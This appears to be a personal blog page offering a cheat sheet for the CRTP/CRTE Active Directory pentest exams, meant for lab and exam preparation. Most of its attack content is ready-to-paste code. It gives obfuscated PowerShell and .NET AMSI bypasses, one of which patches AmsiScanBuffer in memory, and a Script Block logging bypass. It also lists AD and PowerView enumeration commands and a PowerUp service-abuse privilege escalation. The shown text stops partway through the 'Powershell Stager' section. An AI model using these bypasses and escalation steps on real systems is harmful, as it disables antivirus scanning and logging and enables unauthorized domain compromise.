<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>5 - Cheat Sheet |</title>
<meta name="description" content="Cheat Sheet for CRTP/CRTE exams ">


  <meta name="author" content="Nullified">


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="">
<meta property="og:title" content="5 - Cheat Sheet">
<meta property="og:url" content="http://localhost:4000/notes/crte/cheatsheet/">


  <meta property="og:description" content="Cheat Sheet for CRTP/CRTE exams ">



  <meta property="og:image" content="http://localhost:4000/assets/images/main/header4.jpg">





  <meta property="article:published_time" content="2023-12-31T00:00:00+06:00">





  

  


<link rel="canonical" href="http://localhost:4000/notes/crte/cheatsheet/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "john",
      "url": "http://localhost:4000/"
    
  }
</script>






<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title=" Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

<!-- favicon -->
<link rel="icon" type="image/jpeg" sizes="32x32" href="/assets/images/main/fav-32x32.jpeg">
<link rel="icon" type="image/jpeg" sizes="16x16" href="/assets/images/main/fav-16x16.jpeg">
<meta name="theme-color" content="#ffffff">

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/main/kaizen.png" alt=""></a>
        
        <a class="site-title" href="/">
          
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/">Posts</a>
            </li><li class="masthead__menu-item">
              <a href="/menu">Menu</a>
            </li><li class="masthead__menu-item">
              <a href="/about">About</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Toggle search</span>
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
  
    

    <div class="initial-content">
      
  







<div class="page__hero--overlay"
  style=" background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('/assets/images/main/header4.jpg');"
>
  
    <div class="wrapper">
      <h1 id="page-title" class="page__title" itemprop="headline">
        
          5 - Cheat Sheet

        
      </h1>
      
        <p class="page__lead">Cheat Sheet for CRTP/CRTE exams
</p>
      
      
        <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  13 minute read

</p>
      
      
      
    </div>
  
  
</div>





<div id="main" role="main">
  
  <div class="sidebar sticky">
  
  
    
      
      
      
      
    
    
      

<nav class="nav__list">
  
  <input id="ac-toc" name="accordion-toc" type="checkbox" />
  <label for="ac-toc">Toggle menu</label>
  <ul class="nav__items">
    
      <li>
        
          <span class="nav__sub-title">Posts</span>
        

        
        <ul>
          
            <li><a href="/insights/roadmap/">- How to become a Pentester (2024)</a></li>
          
            <li><a href="/awareness/awarenessdoc/">- Security Awareness</a></li>
          
            <li><a href="/c2/sliverbasics/">- Sliver C2 Basics</a></li>
          
            <li><a href="">────────────────</a></li>
          
        </ul>
        
      </li>
    
      <li>
        
          <span class="nav__sub-title">Notes</span>
        

        
        <ul>
          
            <li><a href="/notes/ejpt/">eJPT</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="/review/ecppt/">eCPPTv2</a></li>
          
            <li><a href="/notes/ecppt/systemsecurity/">- System Security</a></li>
          
            <li><a href="/notes/ecppt/networksecurity/">- Network Security</a></li>
          
            <li><a href="/notes/ecppt/powershell/">- Powershell</a></li>
          
            <li><a href="/notes/ecppt/linux/">- Linux Security</a></li>
          
            <li><a href="/notes/ecppt/webapp/">- Web App Security</a></li>
          
            <li><a href="/notes/ecppt/wifi/">- Wi-Fi Pentest</a></li>
          
            <li><a href="/notes/ecppt/ruby/">- Metasploit & Ruby</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="/review/pnpt/">PNPT</a></li>
          
            <li><a href="/notes/pnpt/peh/">- Practical Ethical Hacker</a></li>
          
            <li><a href="/notes/pnpt/osint/">- OSINT</a></li>
          
            <li><a href="/notes/pnpt/pentestexternal/">- External Pentest Playbook</a></li>
          
            <li><a href="/notes/pnpt/linuxprivesc/">- Linux Privesc</a></li>
          
            <li><a href="/notes/pnpt/winprivesc/">- Windows Privesc</a></li>
          
            <li><a href="/notes/pnpt/wpivoting/">- Movement, Pivoting and Persistence</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="/review/eewptx/">eWPTXv2</a></li>
          
            <li><a href="/notes/ewptx/encoding/">- Encoding & Filtering</a></li>
          
            <li><a href="/notes/ewptx/evasionbasics/">- Evasion Basics</a></li>
          
            <li><a href="/notes/ewptx/xss/">- Cross-site scripting (XSS)</a></li>
          
            <li><a href="/notes/ewptx/xssfilter/">- XSS Filter Evasion</a></li>
          
            <li><a href="/notes/ewptx/csrf/">- Cross-site request forgery (CSRF)</a></li>
          
            <li><a href="/notes/ewptx/html5/">- HTML5</a></li>
          
            <li><a href="/notes/ewptx/sqli/">- SQL Injection</a></li>
          
            <li><a href="/notes/ewptx/sqlievasion/">- SQLI Filter Evasion</a></li>
          
            <li><a href="/notes/ewptx/xmlattacks/">- XML Attacks</a></li>
          
            <li><a href="/notes/ewptx/zattackingserialization/">- Attacking Serialization</a></li>
          
            <li><a href="/notes/ewptx/serverside/">- Server Side Attacks</a></li>
          
            <li><a href="/notes/ewptx/crypto/">- Attacking Crypto</a></li>
          
            <li><a href="/notes/ewptx/authenticationsso/">- Authentication & SSO</a></li>
          
            <li><a href="/notes/ewptx/apiscloud/">- APIs & Cloud Apps</a></li>
          
            <li><a href="/notes/ewptx/ldap/">- Attacking LDAP</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="">Active Directory Exploitation</a></li>
          
            <li><a href="/notes/adx/powershell/">- Powershell</a></li>
          
            <li><a href="/notes/adx/bloodhound/">- Bloodhound</a></li>
          
            <li><a href="/notes/adx/privesc/">- Win Privesc</a></li>
          
            <li><a href="/notes/adx/zlateralmov/">- Lateral Movement</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="/review/crtp/">CRTP</a></li>
          
            <li><a href="/notes/crtp/enum/">- AD Enumeration</a></li>
          
            <li><a href="/notes/crtp/winprivesc/">- Local Privesc</a></li>
          
            <li><a href="/notes/crtp/latmov/">- Lateral Movement</a></li>
          
            <li><a href="/notes/crtp/offdotnet/">- Offensive .NET</a></li>
          
            <li><a href="/notes/crtp/domdom/">- AD Persistence</a></li>
          
            <li><a href="/notes/crtp/domprivesc/">- AD Privesc</a></li>
          
            <li><a href="/notes/crtp/defense/">- AD Defense</a></li>
          
            <li><a href="">────────────────</a></li>
          
            <li><a href="/review/crte/">CRTE</a></li>
          
            <li><a href="/notes/crte/latmov/">- Lateral Movement</a></li>
          
            <li><a href="/notes/crte/adprivesc/">- AD Privesc</a></li>
          
            <li><a href="/notes/crte/adpersistence/">- AD Persistence</a></li>
          
            <li><a href="/notes/crte/cross/">- Cross attacks</a></li>
          
            <li><a href="/notes/crte/cheatsheet/" class="active">- Cheat Sheet</a></li>
          
        </ul>
        
      </li>
    
      <li>
        
          <span class="nav__sub-title">My CVEs</span>
        

        
        <ul>
          
            <li><a href="/cve/xss/">CVE-2024-2479</a></li>
          
            <li><a href="/cve/sqli/">CVE-2024-2480</a></li>
          
        </ul>
        
      </li>
    
  </ul>
</nav>

    
  
  </div>



  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="5 - Cheat Sheet">
    <meta itemprop="description" content="Cheat Sheet for CRTP/CRTE exams">
    <meta itemprop="datePublished" content="2023-12-31T00:00:00+06:00">
    

    <div class="page__inner-wrap">
      

      <section class="page__content" itemprop="text">
        
        <h1 id="cheat-sheet">Cheat Sheet</h1>

<p>As we know, these exams are time-based. So, I created this cheat sheet to make sure the syntax of the commands are correct and consequently I dont lose any time with BS.</p>

<blockquote>
  <p>The important part is to understand the content; the cheat sheet is just an <strong>auxiliary tool</strong> in the process.</p>
</blockquote>

<ul>
  <li>There is no hashes or informations of the exams here!</li>
</ul>

<blockquote>
  <p>Copy Button added - tell me what u think</p>
</blockquote>

<style>
  /* Style for the chapter container */
  .chapters {
    margin: 10px;
    padding: 10px;
    border: 1px solid #333;
    border-radius: 15px; 
    font-family: 'Arial', sans-serif;
    background-color: #1a1a1a;
    color: #ddd;
    width: calc(100% - 40px);
  }

  /* Style for the details summary */
  details summary {
    cursor: pointer;
    font-weight: bold;
    background-color: #333;
    padding: 12px;
    border: 1px solid #222;
    border-radius: 8px; 
    margin-bottom: 10px;
  }

  /* Style for the details content */
  details .content {
    margin: 20px 0;
    padding: 20px;
    border: 1px solid #222;
    border-radius: 8px; 
    background-color: #090a08;
  }

  
</style>

<div class="chapters">
  <details>
    <summary>Bypass</summary>    
    <div class="content">
      <p> </p>

      <p><strong>AMSI bypass</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-Item</span><span class="w"> </span><span class="p">(</span><span class="s1">'Va'</span><span class="o">+</span><span class="s1">'rI'</span><span class="o">+</span><span class="s1">'a'</span><span class="o">+</span><span class="s1">'blE:1'</span><span class="o">+</span><span class="s1">'q2'</span><span class="o">+</span><span class="s1">'uZx'</span><span class="p">)</span><span class="w"> </span><span class="p">([</span><span class="n">TYpE</span><span class="p">](</span><span class="s2">"F"</span><span class="o">+</span><span class="s1">'rE'</span><span class="p">))</span><span class="w"> 
</span><span class="p">(</span><span class="n">Get-variable</span><span class="w"> </span><span class="p">((</span><span class="s1">'1Q'</span><span class="o">+</span><span class="s1">'2U'</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="s1">'zX'</span><span class="p">))</span><span class="o">.</span><span class="s2">"A</span><span class="se">`s</span><span class="s2">s</span><span class="se">`E</span><span class="s2">mbly"</span><span class="o">.</span><span class="s2">"GET</span><span class="se">`T</span><span class="s2">Y</span><span class="se">`P</span><span class="s2">e"</span><span class="p">((</span><span class="s1">'Uti'</span><span class="o">+</span><span class="s1">'l'</span><span class="p">,</span><span class="s1">'A'</span><span class="p">,(</span><span class="s1">'Am'</span><span class="o">+</span><span class="s1">'si'</span><span class="p">),(</span><span class="s1">'.Man'</span><span class="o">+</span><span class="s1">'age'</span><span class="o">+</span><span class="s1">'men'</span><span class="o">+</span><span class="s1">'t.'</span><span class="p">),(</span><span class="s1">'u'</span><span class="o">+</span><span class="s1">'to'</span><span class="o">+</span><span class="s1">'mation.'</span><span class="p">),</span><span class="s1">'s'</span><span class="p">,(</span><span class="s1">'Syst'</span><span class="o">+</span><span class="s1">'em'</span><span class="p">)))</span><span class="o">.</span><span class="nf">g</span><span class="err">`</span><span class="n">etf</span><span class="se">`i</span><span class="nx">ElD</span><span class="s2">"(('a'+'msi'),'d',('I'+'nitF'+'aile'))).(sE</span><span class="se">`T`V</span><span class="s2">aLUE)(</span><span class="nv">${n`ULl}</span><span class="s2">,</span><span class="nv">${t`RuE}</span><span class="s2">)
</span></code></pre></div>      </div>

      <p><strong>Script Block logging bypass</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="n">Reflection.Assembly</span><span class="p">]::</span><span class="s2">"l</span><span class="se">`o`A</span><span class="s2">dwIThPa</span><span class="se">`R</span><span class="s2">ti</span><span class="se">`A</span><span class="s2">lnamE"</span><span class="p">((</span><span class="s1">'S'</span><span class="o">+</span><span class="s1">'ystem'</span><span class="o">+</span><span class="s1">'.C'</span><span class="o">+</span><span class="s1">'ore'</span><span class="p">))</span><span class="o">.</span><span class="s2">"g</span><span class="se">`E`T</span><span class="s2">TYPE"</span><span class="p">((</span><span class="s1">'Sys'</span><span class="o">+</span><span class="s1">'tem.Di'</span><span class="o">+</span><span class="s1">'agno'</span><span class="o">+</span><span class="s1">'stics.Event'</span><span class="o">+</span><span class="s1">'i'</span><span class="o">+</span><span class="s1">'ng.EventProv'</span><span class="o">+</span><span class="s1">'i'</span><span class="o">+</span><span class="s1">'der'</span><span class="p">))</span><span class="o">.</span><span class="s2">"gET</span><span class="se">`F</span><span class="s2">I</span><span class="se">`e</span><span class="s2">Ld"</span><span class="p">((</span><span class="s1">'m'</span><span class="o">+</span><span class="s1">'_'</span><span class="o">+</span><span class="s1">'enabled'</span><span class="p">),(</span><span class="s1">'NonP'</span><span class="o">+</span><span class="s1">'ubl'</span><span class="o">+</span><span class="s1">'ic'</span><span class="o">+</span><span class="s1">',Instance'</span><span class="p">))</span><span class="o">.</span><span class="s2">"seTVa</span><span class="se">`l`U</span><span class="s2">e"</span><span class="p">([</span><span class="n">Ref</span><span class="p">]</span><span class="o">.</span><span class="s2">"a</span><span class="se">`s</span><span class="s2">Sem</span><span class="se">`B</span><span class="s2">lY"</span><span class="o">.</span><span class="s2">"gE</span><span class="se">`T`T</span><span class="s2">yPE"</span><span class="p">((</span><span class="s1">'Sys'</span><span class="o">+</span><span class="s1">'tem'</span><span class="o">+</span><span class="s1">'.Mana'</span><span class="o">+</span><span class="s1">'ge'</span><span class="o">+</span><span class="s1">'ment.Aut'</span><span class="o">+</span><span class="s1">'o'</span><span class="o">+</span><span class="s1">'mation.Tracing.'</span><span class="o">+</span><span class="s1">'PSEtwLo'</span><span class="o">+</span><span class="s1">'g'</span><span class="o">+</span><span class="s1">'Pro'</span><span class="o">+</span><span class="s1">'vi'</span><span class="o">+</span><span class="s1">'der'</span><span class="p">))</span><span class="o">.</span><span class="s2">"gEtFIe</span><span class="se">`L</span><span class="s2">d"</span><span class="p">((</span><span class="s1">'e'</span><span class="o">+</span><span class="s1">'twProvid'</span><span class="o">+</span><span class="s1">'er'</span><span class="p">),(</span><span class="s1">'N'</span><span class="o">+</span><span class="s1">'o'</span><span class="o">+</span><span class="s1">'nPu'</span><span class="o">+</span><span class="s1">'b'</span><span class="o">+</span><span class="s1">'lic,Static'</span><span class="p">))</span><span class="o">.</span><span class="s2">"gE</span><span class="se">`T</span><span class="s2">va</span><span class="se">`l</span><span class="s2">Ue"</span><span class="p">(</span><span class="bp">$null</span><span class="p">),</span><span class="mi">0</span><span class="p">)</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>.NET AMSI bypass</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ZQCUW</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sh">@"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string
procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr
dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@</span><span class="w">
</span><span class="n">Add-Type</span><span class="w"> </span><span class="nv">$ZQCUW</span><span class="w">
</span><span class="nv">$BBWHVWQ</span><span class="w"> </span><span class="o">=</span><span class="w">
</span><span class="p">[</span><span class="n">ZQCUW</span><span class="p">]::</span><span class="n">LoadLibrary</span><span class="p">(</span><span class="s2">"</span><span class="si">$(</span><span class="p">[</span><span class="n">SYstem.Net.wEBUtIlITy</span><span class="p">]::</span><span class="n">HTmldecoDE</span><span class="p">(</span><span class="s1">'&amp;#97;&amp;#109;&amp;#115;&amp;#105;&amp;#46;&amp;#100;&amp;#108;&amp;#108;'</span><span class="si">)</span><span class="s2">)"</span><span class="p">)</span><span class="w">
</span><span class="nv">$XPYMWR</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">ZQCUW</span><span class="p">]::</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="nv">$BBWHVWQ</span><span class="p">,</span><span class="w">
</span><span class="s2">"</span><span class="si">$(</span><span class="p">[</span><span class="n">systeM.neT.webUtility</span><span class="p">]::</span><span class="n">HtMldECoDE</span><span class="p">(</span><span class="s1">'&amp;#65;&amp;#109;&amp;#115;&amp;#105;&amp;#83;&amp;#99;&amp;#97;&amp;#110;&amp;#66;&amp;#117;&amp;#102;&amp;#102;&amp;#101;&amp;#114;'</span><span class="si">)</span><span class="s2">)"</span><span class="p">)</span><span class="w">
</span><span class="nv">$p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w">
</span><span class="p">[</span><span class="n">ZQCUW</span><span class="p">]::</span><span class="n">VirtualProtect</span><span class="p">(</span><span class="nv">$XPYMWR</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">uint32</span><span class="p">]</span><span class="mi">5</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="n">x40</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="n">ref</span><span class="p">]</span><span class="nv">$p</span><span class="p">)</span><span class="w">
</span><span class="nv">$TLML</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"0xB8"</span><span class="w">
</span><span class="nv">$PURX</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"0x57"</span><span class="w">
</span><span class="nv">$YNWL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"0x00"</span><span class="w">
</span><span class="nv">$RTGX</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"0x07"</span><span class="w">
</span><span class="nv">$XVON</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"0x80"</span><span class="w">
</span><span class="nv">$WRUD</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"0xC3"</span><span class="w">
</span><span class="nv">$KTMJX</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Byte</span><span class="p">[]]</span><span class="w"> </span><span class="p">(</span><span class="nv">$TLML</span><span class="p">,</span><span class="nv">$PURX</span><span class="p">,</span><span class="nv">$YNWL</span><span class="p">,</span><span class="nv">$RTGX</span><span class="p">,</span><span class="o">+</span><span class="nv">$XVON</span><span class="p">,</span><span class="o">+</span><span class="nv">$WRUD</span><span class="p">)</span><span class="w">
</span><span class="p">[</span><span class="n">System.Runtime.InteropServices.Marshal</span><span class="p">]::</span><span class="n">Copy</span><span class="p">(</span><span class="nv">$KTMJX</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nv">$XPYMWR</span><span class="p">,</span><span class="w"> </span><span class="mi">6</span><span class="p">)</span><span class="w">
</span></code></pre></div>      </div>

    </div>
  </details>

  <details>
    <summary>Enumeration</summary>    
    <div class="content">
      <p> </p>

      <p><strong>AD Module</strong>:
Import:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Import-Module</span><span class="w"> </span><span class="nx">C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="nx">C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1</span><span class="w">
</span></code></pre></div>      </div>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADUser</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Select</span><span class="w"> </span><span class="nt">-ExpandProperty</span><span class="w"> </span><span class="nx">samaccountname</span><span class="w">
</span><span class="n">Get-ADComputer</span><span class="w"> </span><span class="err">–</span><span class="nx">Filter</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="err">–</span><span class="nx">expand</span><span class="w"> </span><span class="nx">name</span><span class="w">
</span><span class="n">Get-ADGroup</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'Domain Admins'</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="o">*</span><span class="w">
</span><span class="n">Get-ADGroup</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">machineadmins</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="nx">Description</span><span class="w">
</span><span class="n">Get-ADGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'Domain Admins'</span><span class="w">
</span><span class="n">Get-ADGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'Enterprise Admins'</span><span class="w">
</span><span class="n">Get-ADGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'Enterprise Admins'</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="nx">domain.local</span><span class="w">
</span><span class="n">Get-ADOrganizationalUnit</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'OU=StudentsMachines,DC=us,DC=domain,DC=local'</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">%</span><span class="p">{</span><span class="n">Get-ADComputer</span><span class="w"> </span><span class="nt">-SearchBase</span><span class="w"> </span><span class="bp">$_</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">name</span><span class="w">
</span><span class="n">Get-ACL</span><span class="w"> </span><span class="s1">'AD:\CN=Domain Admins,CN=Users,DC=us,DC=domain,DC=local'</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nt">-ExpandProperty</span><span class="w"> </span><span class="nx">Access</span><span class="w">
</span><span class="p">(</span><span class="n">Get-ADForest</span><span class="p">)</span><span class="o">.</span><span class="nf">Domains</span><span class="w">
</span><span class="nx">Get-ADTrust</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w">
</span><span class="n">Get-ADTrust</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="s1">'intraForest -ne $True'</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="p">(</span><span class="n">Get-ADForest</span><span class="p">)</span><span class="o">.</span><span class="nf">Name</span><span class="w">
</span><span class="p">(</span><span class="n">Get-ADForest</span><span class="p">)</span><span class="o">.</span><span class="nf">Domains</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">%</span><span class="p">{</span><span class="n">Get-ADTrust</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="s1">'(intraForest -ne $True) -and (ForestTransitive -ne $True)'</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="bp">$_</span><span class="p">}</span><span class="w">
</span><span class="n">Get-ADTrust</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="nx">domain.local</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Powerview</strong>:
Import</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">.</span><span class="w"> </span><span class="n">C:\AD\Tools\PowerView.ps1</span><span class="w">
</span></code></pre></div>      </div>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="n">Get-DomainPolicy</span><span class="p">)</span><span class="o">.</span><span class="nf">KerberosPolicy</span><span class="w">
</span><span class="nx">Get-DomainGPOLocalGroup</span><span class="w">
</span><span class="n">Get-DomainGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">group</span><span class="err">&gt;</span><span class="w">
</span><span class="n">Get-DomainOU</span><span class="w">
</span><span class="p">(</span><span class="n">Get-DomainOU</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">OU</span><span class="err">&gt;</span><span class="p">)</span><span class="o">.</span><span class="nf">distinguishedname</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">%</span><span class="p">{</span><span class="n">Get-DomainComputer</span><span class="w"> </span><span class="nt">-SearchBase</span><span class="w"> </span><span class="bp">$_</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">name</span><span class="w">
</span><span class="n">Get-DomainGPO</span><span class="w">
</span><span class="p">(</span><span class="n">Get-DomainOU</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">OU</span><span class="err">&gt;</span><span class="p">)</span><span class="o">.</span><span class="nf">gplink</span><span class="w">
</span><span class="nx">Get-DomainGPO</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'{&lt;result of .gplink&gt;}'</span><span class="w">
</span><span class="n">Get-DomainObjectAcl</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s2">"Domain Admins"</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span><span class="n">Find-InterestingDomainAcl</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityReferenceName</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"&lt;user&gt;"</span><span class="p">}</span><span class="w">
</span><span class="n">Find-InterestingDomainAcl</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityReferenceName</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"&lt;group&gt;"</span><span class="p">}</span><span class="w">
</span><span class="n">Get-ForestDomain</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Get-DomainTrust</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">TrustAttributes</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="s1">'FILTER_SIDS'</span><span class="p">}</span><span class="w">
</span><span class="n">Get-ForestTrust</span><span class="w"> </span><span class="nt">-Forest</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">forest</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div>      </div>

    </div>
  </details>

  <details>
    <summary>Powershell Stager</summary>
    <div class="content">
      <p> </p>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w">
</span><span class="o">.</span><span class="w"> </span><span class="nx">C:\AD\Tools\PowerUp.ps1</span><span class="w">
</span><span class="n">Invoke-AllChecks</span><span class="w">
</span><span class="nx">Invoke-ServiceAbuse</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nx">ALG</span><span class="w"> </span><span class="nt">-UserName</span><span class="w"> </span><span class="nx">domain\studentuserx</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Same attack with accesschk64 from SysInternals</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">.</span><span class="n">\accesschk64.exe</span><span class="w"> </span><span class="nt">-uwcqv</span><span class="w"> </span><span class="s1">'user'</span><span class="w"> </span><span class="o">*</span><span class="w">

